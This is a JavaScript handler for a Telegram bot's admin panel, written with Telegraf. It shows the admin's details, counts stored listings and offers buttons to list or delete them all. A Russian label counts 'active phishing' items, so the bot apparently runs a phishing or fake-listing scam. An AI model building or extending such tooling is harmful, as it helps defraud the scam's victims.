const { Markup } = require("telegraf");

const { items } = require("../../../../database/index")

module.exports = async (ctx) => {
  try {
    const itemsCount = await items.count()

    return ctx
      .editMessageText(
        `<b>🗂️ Текущий раздел:</b>
╰ 📦 Панель администратора -> Объявления

╭ ▫️ <b>Username:</b> <code>${ctx.from.first_name}</code>
├ ▫️ <b>User ID:</b> <code>${ctx.from.id}</code>
╰ ▫️ <b>Tag:</b> <code>#${ctx.state.user.tag}</code>

├ 📦 <b>Активных фишингов:</b> ${itemsCount}`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("📄 Список объявлений", `admin_items_list`),
              Markup.callbackButton("♻️ Удалить все", `admin_items_destroyAll`),
            ],
            [Markup.callbackButton("< Назад", "admin")],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
    console.log(err);
  }
};